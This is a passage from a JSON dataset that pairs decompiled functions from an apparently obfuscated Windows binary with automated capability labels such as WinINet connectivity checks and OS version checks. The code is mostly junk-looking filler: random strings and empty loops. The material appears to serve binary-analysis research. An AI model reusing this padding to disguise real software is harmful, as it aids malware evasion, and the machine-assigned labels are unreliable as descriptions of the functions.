            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.00414d7c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f0h;\n    uint var_d8h;\n    uint var_c0h;\n    uint var_a8h;\n    uint var_90h;\n    uint var_78h;\n    uint var_5eh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h [27];\n    uint var_3dh;\n    uchar var_23h;\n    uchar var_22h;\n    uint var_21h;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522608;\n    stack0xffffffdc = *0x522288;\n    var_21h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"lnpqetsifgwlwzfjquocitjftghnhaidyhxdmumzffdk\", &var_5eh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zdlpvurfupsqkbjfzyrfcelcxlqgavviin\", &var_5eh + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"cjrkbyydrsoraclibjxrpzyjfwfcisx\", &var_5eh + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tcapalukugwwazcmapytgcqyt\", &var_5eh + 3);\n    fcn.00483140();\n    var_22h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"kzmvetjrpmdpocwmrymgjwhdrwozqsgdxnomxbtwlumxmtacvkrxkgkrm\", &var_5ah);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"sdkwjalgpewsiwyckpsowhdsmhjfmxbqeccmgtoupobswaeskhvwmmnkpucpmlhvtquhxexyqnwkqn\", &var_59h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"kzmvetjrpmdpocwmrymgjwhdrwozqsgdxnomxbtwlumxmtacvkrxkgkrm\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"kzmvetjrpmdpocwmrymgjwhdrwozqsgdxnomxbtwlumxmtacvkrxkgkrm\", &var_23h);\n    cVar2 = fcn.004c1070(&var_3dh + 1, var_58h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522610;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x51; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 984
    },
    "00415106": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00415106(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    char cVar1;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x1660;\n    var_18h = 0x492;\n    fcn.00483110();\n    fcn.004b21e0(\"twamvgajrdscpfmfv\", &var_59h);\n    fcn.00483140();\n    stack0xffffffdc = *0x522618;\n    fcn.00483110();\n    fcn.004b21e0(\"twamvgajrdscpfmfv\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"twamvgajrdscpfmfv\", &var_21h);\n    cVar1 = fcn.004c09a0(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x30; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x5f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 562
    },
    "00416146": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00416146(uint param_1)\n\n{\n    char cVar1;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_51h;\n    uint var_35h;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    var_18h = 0x2da;\n    fcn.00483110();\n    fcn.004b21e0(\"jipowoewtuinmkbaksetfappnerfarqkbpiimzyiflzhvbspjcykxuhjkakfcdut\", &var_51h);\n    fcn.00483140();\n    var_19h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"jipowoewtuinmkbaksetfappnerfarqkbpiimzyiflzhvbspjcykxuhjkakfcdut\", &var_35h);\n    fcn.00483110();\n    fcn.004b21e0(\"jipowoewtuinmkbaksetfappnerfarqkbpiimzyiflzhvbspjcykxuhjkakfcdut\", &var_1bh);\n    cVar1 = fcn.004c09a0(&var_35h + 1, &var_51h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x4d; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 0x17; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"fvcganjayqdwkw\", &var_1ah);\n    fcn.00483140();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 554
    },
    "004162e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl\nfcn.004162e4(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h, uint arg_34h)\n\n{\n    char cVar1;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ah;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uint var_29h;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x131;\n    var_18h = 0x130;\n    var_1ch = 0xbd1;\n    fcn.00483110();\n    fcn.004b21e0(\"afnmohukulbfyqccryrjckpcvpkmfcukdxaxlvpxhfvtevqqeqsuenhqvvqvm\", &var_9ah);\n    fcn.00483140();\n    var_1dh = 1;\n    stack0xffffffd4 = *0x522748;\n    fcn.00483110();\n    fcn.004b21e0(0x51c6ca, &var_9ah + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x51c6ca, &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(0x51c6ca, &var_61h);\n    cVar1 = fcn.004c09a0(&var_7dh + 1, &var_9ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x5f; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51c6ca, &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(0x51c6ca, &var_29h);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x51; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 788
    },
    "004165c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004165c8(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_148h;\n    uint var_144h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_120h;\n    uint var_108h;\n    uint var_efh;\n    uint var_d1h;\n    uint var_b5h;\n    uint var_99h;\n    uint var_7dh;\n    uint var_61h;\n    uchar var_45h;\n    uint var_44h;\n    ulong uStack68;\n    uint var_31h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"wprpdyfvyzzcbmozuhkbol\", &var_efh);\n    fcn.00483140();\n    var_19h._0_1_ = 0;\n    var_20h = 0x87f;\n    var_24h = 0x1a0c;\n    stack0xffffffcc = *0x522750;\n    var_31h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"gonlvttxmnuvzigoihxysaqujjqsimaevsezohqvbugepxyqenqmnnjooworvqebawiozbliilwkiqjmvsertfamsbbxkhkizji\", \n                 &var_efh + 1);\n    fcn.00483140();\n    uStack68 = *0x522758;\n    fcn.00483110();\n    fcn.004b21e0(\"whdiqmxczpwkcpzijwgjgclgufdkxdehcquxqfgck\", &var_efh + 2);\n    fcn.00483140();\n    var_44h = 0x83b;\n    fcn.00483110();\n    fcn.004b21e0(\"whdiqmxczpwkcpzijwgjgclgufdkxdehcquxqfgck\", &var_d1h);\n    fcn.00483110();\n    fcn.004b21e0(\"whdiqmxczpwkcpzijwgjgclgufdkxdehcquxqfgck\", &var_b5h);\n    cVar2 = fcn.004c1070(&var_d1h + 1, &var_efh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x3d; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"gonlvttxmnuvzigoihxysaqujjqsimaevsezohqvbugepxyqenqmnnjooworvqebawiozbliilwkiqjmvsertfamsbbxkhkizji\", \n                 &var_99h);\n    fcn.00483110();\n    fcn.004b21e0(\"gonlvttxmnuvzigoihxysaqujjqsimaevsezohqvbugepxyqenqmnnjooworvqebawiozbliilwkiqjmvsertfamsbbxkhkizji\", \n                 &var_7dh);\n    cVar2 = fcn.004c09a0(&var_99h + 1, &var_b5h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x16; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x37; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wprpdyfvyzzcbmozuhkbol\", &var_61h);\n    fcn.00483110();\n    fcn.004b21e0(\"wprpdyfvyzzcbmozuhkbol\", &var_45h);\n    cVar2 = fcn.004c09a0(&var_61h + 1, &var_7dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522760;\n    if (cVar2 != '\\0') {\n        for (stack0xffffffe4 = 0x1e; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 1279
    },
    "00416a2e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00416a2e(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_168h;\n    uint var_164h;\n    uint var_15ch;\n    uint var_14ch;\n    uint var_134h;\n    uint var_11ch;\n    uint var_103h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_1ch = 0xe94;\n    fcn.00483110();\n    fcn.004b21e0(\"ogflvavdqrqohctiigfjvyqfpyafnpuvniymeeuxjhppefxxydwsliyhwemqhtgsdmpxx\", &var_103h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wpfbjkdedbqhikmomtbztvrvykvxgohwklguitjwgdcgxauorgwaescwuhephdoigcezlrodxsxxwhhakoajkr\", &var_103h + 1\n                );\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"uhkzhycwzayrlfgwhtldnbtvnadoictjsupmydalvjycigjxrodigudfqbmlsrl\", &var_103h + 2);\n    fcn.00483140();\n    var_20h = 0x1536;\n    fcn.00483110();\n    fcn.004b21e0(\"wpfbjkdedbqhikmomtbztvrvykvxgohwklguitjwgdcgxauorgwaescwuhephdoigcezlrodxsxxwhhakoajkr\", &var_e5h);\n    fcn.00483110();\n    fcn.004b21e0(\"wpfbjkdedbqhikmomtbztvrvykvxgohwklguitjwgdcgxauorgwaescwuhephdoigcezlrodxsxxwhhakoajkr\", &var_c9h);\n    cVar1 = fcn.004c09a0(&var_e5h + 1, &var_103h + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x57; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"uhkzhycwzayrlfgwhtldnbtvnadoictjsupmydalvjycigjxrodigudfqbmlsrl\", &var_adh);\n    fcn.00483110();\n    fcn.004b21e0(\"uhkzhycwzayrlfgwhtldnbtvnadoictjsupmydalvjycigjxrodigudfqbmlsrl\", &var_91h);\n    cVar1 = fcn.004c1070(&var_adh + 1, &var_c9h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x3a; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"uhkzhycwzayrlfgwhtldnbtvnadoictjsupmydalvjycigjxrodigudfqbmlsrl\", &var_75h);\n    fcn.00483110();\n    fcn.004b21e0(\"uhkzhycwzayrlfgwhtldnbtvnadoictjsupmydalvjycigjxrodigudfqbmlsrl\", &var_59h);\n    cVar1 = fcn.004c1070(&var_75h + 1, &var_91h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x57; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ogflvavdqrqohctiigfjvyqfpyafnpuvniymeeuxjhppefxxydwsliyhwemqhtgsdmpxx\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ogflvavdqrqohctiigfjvyqfpyafnpuvniymeeuxjhppefxxydwsliyhwemqhtgsdmpxx\", &var_21h);\n    cVar1 = fcn.004c1070(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x33; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1447
    },
    "00416f28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.00416f28(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_5h;\n    \n    for (stack0xfffffff8 = 0x30; 0 < stack0xfffffff8; unique0x00007a80 = stack0xfffffff8 + -1) {\n    }\n    return *0x522770;\n}\n",
        "token_count": 222
    },
    "00417070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.00417070(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_94h;\n    uint var_7ch;\n    uint var_62h;\n    uint var_45h;\n    uint var_29h;\n    uint var_19h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x522790;\n    fcn.00483110();\n    fcn.004b21e0(\"lbyzeecuexvzlacwblkupnswhgpnqyiqyqtd\", &var_62h);\n    fcn.00483140();\n    var_19h._0_1_ = 1;\n    stack0xffffffd4 = *0x522798;\n    fcn.00483110();\n    fcn.004b21e0(0x51c88d, &var_62h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lbyzeecuexvzlacwblkupnswhgpnqyiqyqtd\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"lbyzeecuexvzlacwblkupnswhgpnqyiqyqtd\", &var_29h);\n    cVar2 = fcn.004c09a0(&var_45h + 1, &var_62h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x5227a0;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x31; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x60; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 619
    },
    "0041727e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041727e(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h, uint noname_5, uint noname_6, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_31h;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"hjkmjjzmwugusfjmlzdeatxitpqltzewyo\", &var_31h);\n    fcn.00483140();\n    var_dh._0_1_ = 1;\n    var_14h = 0x1154;\n    var_18h = 0xb70;\n    uStack36 = *0x5227a8;\n    var_24h = 0x935;\n    var_28h = 0x138;\n    stack0xffffffcc = *0x5227b0;\n    for (stack0xfffffff0 = 0x62; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 394
    },
    "0041734a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0041734a(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x4c; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return *0x5227b8;\n}\n",
        "token_count": 111
    },
    "0041738a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041738a(uint arg_8h)\n\n{\n    uint var_48h;\n    uint var_44h;\n    uint var_38h;\n    uint var_31h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x11; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x31; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "0041746a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041746a(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x45; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "00417ed2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417ed2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x57; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x2d; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 156
    },
    "00418126": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00418126(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_ch;\n    \n    for (var_ch = 0x3b; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 144
    },
    "00418188": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00418188(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    double dVar1;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_31h;\n    uint var_29h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x1496;\n    fcn.00483110();\n    fcn.004b21e0(\"ymnqybsjojwbeobgtpextlnssiigfw\", &var_31h);\n    fcn.00483140();\n    dVar1 = *0x5228b8;\n    stack0xffffffe4 = *0x5228a8;\n    var_19h._0_1_ = 0;\n    var_20h = 0xe51;\n    stack0xffffffd4 = *0x5228b0;\n    var_29h._0_1_ = 1;\n    stack0xffffffcc = 0x6d1;\n    for (var_ch = 0x3a; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 364
    },
    "0041824e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.0041824e(uint noname_0, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    double dVar1;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_3ch;\n    uint var_22h;\n    uint var_18h;\n    uint var_14h;\n    uchar var_eh;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"crfitihqnqgbnflmkrqbttrzvywicituxlythcqbrtmxsielbnxzzezvjoiac\", &var_22h);\n    fcn.00483140();\n    var_dh._0_1_ = 1;\n    var_eh = 1;\n    var_14h = 0x52c;\n    var_18h = 0x8d1;\n    stack0xffffffdc = *0x5228c0;\n    fcn.00483110();\n    fcn.004b21e0(\"hbyralpdukbuhggwwhpjvencthrnddtlhxultafclsjtumactdsxwaxbqjesnsbscsjuiwauiyejgzr\", &var_22h + 1);\n    fcn.00483140();\n    dVar1 = *0x5228c8;\n    for (stack0xfffffff0 = 0x20; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 485
    },
    "0041836a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
